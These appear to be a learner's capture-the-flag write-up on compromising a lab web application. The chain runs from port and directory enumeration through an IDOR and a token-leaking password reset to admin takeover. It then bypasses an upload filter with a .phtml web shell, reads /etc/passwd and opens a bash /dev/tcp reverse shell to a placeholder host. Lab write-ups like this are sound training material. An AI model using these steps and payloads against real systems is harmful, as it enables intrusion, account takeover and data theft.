
nmap result 

ports 

22, 80, 3006, 8080 open. 

22 is good for SSh in case credentials can be aquired

3006 indicates SQL that could be an possible exploit for injection. 

curl 

curl -I http://10.65.155.184
HTTP/1.1 200 OK
Date: Tue, 11 Aug 2026 12:46:11 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=9bdnlbtc6sanlrnf12k3v4mt7h; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8

confirms thar server is Apache 2.4.58 
phpsessid confirms php session manegment 
and previous taken informaton tells abou sql 

classic LAMP configuration (look what is lamp) 

with gobuster various directores can be discovered 

gobuster dir -u http://10.65.155.184 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.155.184
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 21600]
/profile.php          (Status: 302) [Size: 0] 
/login.php            (Status: 200) [Size: 15107]
/jobs.php             (Status: 200) [Size: 20288]
/uploads              (Status: 301) [Size: 314] 
/data                 (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] 
/test                 (Status: 200) [Size: 705]
/includes             (Status: 301) [Size: 315]
/api                  (Status: 301) [Size: 310] 
/logout.php           (Status: 302) [Size: 0] 
/config               (Status: 301) [Size: 313] 
/dashboard.php        (Status: 302) [Size: 0] 
/register.php         (Status: 200) [Size: 17384]
/reset.php            (Status: 200) [Size: 14408]
/.php                 (Status: 403) [Size: 277]
Progress: 175328 / 175330 (100.00%)
===============================================================
Finished
===============================================================

after login with an user 
IDOR found on links 
http://10.65.155.184/profile.php?id=6


when done 
curl http://IP/api 

Api lists itself endpoints 

Information that an user should not be able to access on production enviroments. 


testing IDOR 

when change id from 6 to --> 1 

http://10.65.155.184/profile.php?id=1

able to access another profile. 

in this case adiministor, and found as well an email, that could be potentialy exploited on reset.php. 

notice that in most cases lower ids when using number coul be staff id. 

also can be done with phpsession id cookie via curl 

curl -s -b "PHPSESSID=gs5ngd6duukc09agpdnj1o9tt2" "http://10.65.155.184/profile.php?id=1" | grep "fw-semibold"
                        <div class="fw-semibold mt-1">Sarah Mitchell</div>
                        <div class="fw-semibold mt-1 mono">s.mitchell@recruitx.thm</div>
                        <div class="fw-semibold mt-1">March 24, 2026</div>


the earlier discoved endpoint /api/user uses the same pattern 

and revels even more than the curl to the web application, showing us the json structure and member role 


know with all that information gathered 

we can trie fuzz with reset password flux. 

we know adminitrator email s.mitchell@recruitx.thm 
but try to brutforce our way in may not be the smart move, could trigger IDS/IPS systems, rate limits, account lockout and so on. 

first we can try to discover how the reset.php is build/works and loo if is exploitable to than decide the best aproche to for gain access to admin account


token and reset link its displayed to user, this information should not be display so only who had access to the email in question can access the link and token

we succefully reset admin password 

why ? 

Token displayed in response: The token should only be sent to the account owner's email, never displayed on screen.
Weak token generation - A six-digit numeric token has a small keyspace and is susceptible to brute-force attacks.
No rate limiting - The application did not limit the number of reset requests or token guesses.

also changed the password to qwerty123 WEEK PASSWORD requisites. 

after check admin panel upload feature was uncovered. 

looking up the panel says thaat only accepts some types of documment 
but the html displays the accepts="types" that show that possible this is an validation only on the client side
Perhaps its possible to bypass to see if the server accepts any format. 

edit accept tag to accept .txt 

Upload 

ban, server side validation 

but how troughrou is ? 

the room sudgests to try phtml 
that server interprets as php 

echo '<?php echo "PHP is executing"; ?>' > test.phtml 

create one 

redit tag 

upload 

sucess 

go to the path 

voila! 


well with that in mind we can try to create an shell 

A web shell is a small script that accepts commands through parameters and executes them on the server. Let's create a simple one and save it as shell.phtml:

his script checks for a cmd parameter in the URL. If present, it passes the value to shell_exec(), which runs the command on the operating system and returns the output.

lets execute in curl  


varies informations 

an we can as deep as etc/passwrd

By utilising our web shell, we accessed /etc/passwd and identified system users. In a real-world scenario, this level of access would enable further enumeration of configuration files to extract database credentials and gain full access to the application's backend data.


ok lets stop play arround 

reverse shell 

start listener 

nc -lvnp 4444 or use metasploit or any shell manager like penelope 

with the folowing comand on curl 

curl "http://10.65.155.184/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/CONNECTION_IP/4444+0>%261'" 

its possible to obtaing an connection with server trought an shell. 


after stabilish connection is possible to navigate through the machine 

here we capture the flag as the honey pot 

but a series of flaws/vulnerabilites exploited thogether lead us to an RCE reverse shell 

In real cases this can allow an bad actor to gain root access, make lateral movement, spread malware, exfiltrate sensible data, install an backdoor. 


the attack chain 



    Enumeration: We discovered the application's technology stack (, , MySQL), its directory structure, an endpoint, a password reset page, an uploads directory, and an admin panel.
    (Task 3): The /profile.php?id= parameter and the /api/user?id= endpoint allowed us to enumerate all users, including the administrator's name and email address.
    Weak Password Reset (Task 4): The reset mechanism displayed tokens directly in the HTTP response, allowing us to generate a token for the administrator and change her password.
    Admin Panel Access (Task 5): Using the compromised administrator account, we accessed the admin panel and found a file upload function with an incomplete extension blocklist.
    Remote Code Execution (Task 6):  We uploaded a PHP web shell using the .phtml extension, which bypassed the filter. This gave us command execution on the server and a path to a full reverse shell.

No single vulnerability in this chain led to full server compromise on it's own. The leaked user information but did not provide direct access. The password reset was exploitable but only useful because we already knew the admin's email. The upload filter had a bypass, but we needed admin credentials to reach it. It was the combination of these weaknesses that led to full server compromise.

remediations 


